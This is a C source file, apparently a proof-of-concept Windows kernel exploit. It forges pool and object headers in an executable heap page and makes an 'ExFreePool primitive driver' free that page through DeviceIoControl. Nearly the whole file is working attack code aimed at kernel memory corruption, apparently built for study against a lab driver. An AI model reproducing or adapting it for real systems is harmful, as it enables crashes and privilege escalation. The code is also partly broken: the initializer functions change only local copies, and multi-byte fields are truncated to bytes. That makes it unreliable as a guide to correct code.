#include "exploit.h"

int main(int argc, char** argv)
{
	system("title ExFreePool");

	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	char* memory_page = (void*)0;
	POOL_HEADER pool_header;
	OBJECT_HEADER_QUOTA object_header_quota;
	OBJECT_HEADER object_header;
	char output[1024];
	unsigned long bytes_returned = 0L, old_protection = 0L;

	RtlSecureZeroMemory(&pool_header, sizeof(pool_header));
	RtlSecureZeroMemory(&object_header_quota, sizeof(object_header_quota));
	RtlSecureZeroMemory(&object_header, sizeof(object_header));
	RtlSecureZeroMemory(&output, sizeof(output));

	printf("%s\n[!] ExFreePoolWithTag Proof-of-Concept Exploit\n[!] Lets Exploit!", BANNER);

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the ExFreePool primitive driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the ExFreePool primitive driver. Handle Value: 0x%p", h_driver);

	memory_page = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
	if (!memory_page)
	{
		printf("\n[-] Failed to allocate 4096 bytes onto the process heap.");
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes onto the process heap. Allocation Address: 0x%p", memory_page);

	if (!VirtualLock(memory_page, 4096))
	{
		printf("\n[-] Failed to lock the page of heap memory. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Locked the page of heap memory.");

	if (!VirtualProtect(memory_page, 4096, PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the allocation as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the allocation as read+write+executable.");

	initialize_pool_header(&pool_header);
	printf("\n[+] Initialized fake pool header.");

	initialize_object_header_quota(&object_header_quota);
	printf("\n[+] Initialized fake object header quota.");

	initialize_object_header(&object_header);
	printf("\n[+] Initialized fake object header.");

	*memory_page = pool_header.PreviousSize;
	*(memory_page + 4) = pool_header.PoolIndex;
	*(memory_page + 8) = pool_header.BlockSize;
	*(memory_page + 16) = pool_header.PoolType;
	*(memory_page + 20) = pool_header.Ulong1;
	*(memory_page + 24) = pool_header.PoolTag;
	*(memory_page + 28) = pool_header.AllocatorBackTraceIndex;
	*(memory_page + 30) = pool_header.PoolTagHash;
	printf("\n[+] Mapped the fake pool header onto the heap allocation.");

	*(memory_page + 32) = object_header_quota.PagedPoolCharge;
	*(memory_page + 36) = object_header_quota.NonPagedPoolCharge;
	*(memory_page + 40) = object_header_quota.SecurityDescriptorCharge;
	*(memory_page + 44) = object_header_quota.Reserved1;
	*(memory_page + 48) = object_header_quota.SecurityDescriptorQuotaBlock;
	*(memory_page + 52) = object_header_quota.Reserved2;
	printf("\n[+] Mapped the fake object header quota onto the heap allocation.");

	*(memory_page + 56) = object_header.PointerCount;
	*(memory_page + 64) = object_header.HandleCount;
	*(memory_page + 72) = object_header.NextToFree;
	*(memory_page + 80) = object_header.Lock;
	*(memory_page + 81) = object_header.TypeIndex;
	*(memory_page + 82) = object_header.TraceFlags;
	*(memory_page + 84) = object_header.DbgRefTrace;
	*(memory_page + 88) = object_header.DbgTracePermanent;
	*(memory_page + 89) = object_header.InfoMask;
	*(memory_page + 90) = object_header.Flags;
	*(memory_page + 94) = object_header.NewObject;
	*(memory_page + 98) = object_header.KernelObject;
	*(memory_page + 102) = object_header.KernelOnlyAccess;
	*(memory_page + 106) = object_header.ExclusiveObject;
	*(memory_page + 110) = object_header.PermanentObject;
	*(memory_page + 114) = object_header.DefaultSecurityQuota;
	*(memory_page + 118) = object_header.SingleHandleEntry;
	*(memory_page + 122) = object_header.DeletedInline;
	*(memory_page + 126) = object_header.Reserved;
	*(memory_page + 130) = object_header.ObjectCreateInfo;
	*(memory_page + 138) = object_header.QuotaBlockCharged;
	*(memory_page + 146) = object_header.SecurityDescriptor;
	*(memory_page + 152) = object_header.Body;
	printf("\n[+] Mapped the fake object header onto the heap allocation.\n[!] Freeing the target pool chunk in five seconds...");

	Sleep(5000);
	if (!VirtualUnlock(memory_page, 4096))
	{
		printf("\n[-] Failed to unlock the memory page prior to freeing the chunk.");
		unused = getchar();
		return 1;
	}
	DeviceIoControl(h_driver, TARGET_IOCTL, &memory_page, sizeof(long long), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Unlocked the memory page and freed the target pool chunk.\n[+] Exploit completed.");
	unused = getchar();

	return 0;
}

void initialize_pool_header(PPOOL_HEADER input_pool_header)
{
	POOL_HEADER pool_header = *input_pool_header;	// dt nt!_POOL_HEADER ffffaa0b73f0dae0

	pool_header.PreviousSize = 0;					// +0x000 PreviousSize     : 0y00000000 (0)
	pool_header.PoolIndex = 0;						// +0x000 PoolIndex        : 0y00000000 (0)
	pool_header.BlockSize = 0x1000;					// +0x002 BlockSize        : 0y00010111 (0x17) (Changed to 0x1000 to match our fake pool allocation)
	pool_header.PoolType = NonPagedPoolExecute;		// +0x002 PoolType         : 0y00000010 (0x2) (Changed to 0 so the pool is mapped as NonPagedPoolExecute as opposed to NonPagedPoolMustSucceed)
	pool_header.Ulong1 = 0x2170000;					// +0x000 Ulong1           : 0x2170000
	pool_header.PoolTag = 0x70707746;				// +0x004 PoolTag          : 0x70707746
	pool_header.AllocatorBackTraceIndex = 0x6B5E;	// +0x008 AllocatorBackTraceIndex : 0x6b5e
	pool_header.PoolTagHash = 0x9417;				// +0x00a PoolTagHash      : 0x9417
}

void initialize_object_header_quota(POBJECT_HEADER_QUOTA input_object_header_quota)
{
	OBJECT_HEADER_QUOTA object_header_quota = *input_object_header_quota;  // dt nt!_OBJECT_HEADER_QUOTA_INFO ffffaa0b73f0dae0+8

	object_header_quota.PagedPoolCharge = 0x94176B5E;					   // +0x000 PagedPoolCharge  : 0x94176b5e
	object_header_quota.NonPagedPoolCharge = 0xDE0E839E;				   // +0x004 NonPagedPoolCharge : 0xde0e839e
	object_header_quota.SecurityDescriptorCharge = 0x73F132A0;			   // +0x008 SecurityDescriptorCharge : 0x73f132a0
	object_header_quota.Reserved1 = 0xFFFFAA0B;							   // +0x00c Reserved1        : 0xffffaa0b
	object_header_quota.SecurityDescriptorQuotaBlock = 0xFFFF8407C9848D78; // +0x010 SecurityDescriptorQuotaBlock : 0xffff8407`c9848d78 Void
	object_header_quota.Reserved2 = 0;									   // +0x018 Reserved2        : 0
}

void initialize_object_header(POBJECT_HEADER input_object_header)
{
	OBJECT_HEADER object_header = *input_object_header;						// dt nt!_OBJECT_HEADER ffffaa0b73f0dae0+8+10

	object_header.PointerCount = 0x136305996165768;							// +0x000 PointerCount     : 0n-136305996165768
	object_header.HandleCount = 0;											// +0x008 HandleCount      : 0n0
	object_header.NextToFree = (void*)0;									// +0x008 NextToFree       : (null)
	object_header.Lock = (void*)0;											// +0x010 Lock             : _EX_PUSH_LOCK
	object_header.TypeIndex = 0;											// +0x018 TypeIndex        : 0 '';
	object_header.TraceFlags = 0;											// +0x019 TraceFlags       : 0 ''
	object_header.DbgRefTrace = 0;											// +0x019 DbgRefTrace      : 0y0
	object_header.DbgTracePermanent = 0;									// +0x019 DbgTracePermanent : 0y0
	object_header.InfoMask = 0;												// +0x01a InfoMask         : 0 ''
	object_header.Flags = 0;												// +0x01b Flags            : 0 ''
	object_header.NewObject = 0;											// +0x01b NewObject        : 0y0
	object_header.KernelObject = 0;											// +0x01b KernelObject     : 0y0
	object_header.KernelOnlyAccess = 0;										// +0x01b KernelOnlyAccess : 0y0
	object_header.ExclusiveObject = 0;										// +0x01b ExclusiveObject  : 0y0
	object_header.PermanentObject = 0;										// +0x01b PermanentObject  : 0y0
	object_header.DefaultSecurityQuota = 0;									// +0x01b DefaultSecurityQuota : 0y0
	object_header.SingleHandleEntry = 0;									// +0x01b SingleHandleEntry : 0y0
	object_header.DeletedInline = 0;										// +0x01b DeletedInline    : 0y0
	object_header.Reserved = 0;												// +0x01c Reserved         : 0
	object_header.ObjectCreateInfo = 0x0100000000000130;					// +0x020 ObjectCreateInfo : 0x01000000`00000130 _OBJECT_CREATE_INFORMATION
	object_header.QuotaBlockCharged = 0x0100000000000130;					// +0x020 QuotaBlockCharged : 0x01000000`00000130 Void
	object_header.SecurityDescriptor = 0x0001001000000130;					// +0x028 SecurityDescriptor : 0x00010010`00000130 Void
	object_header.Body = (void*)0;											// +0x030 Body             : _QUAD
}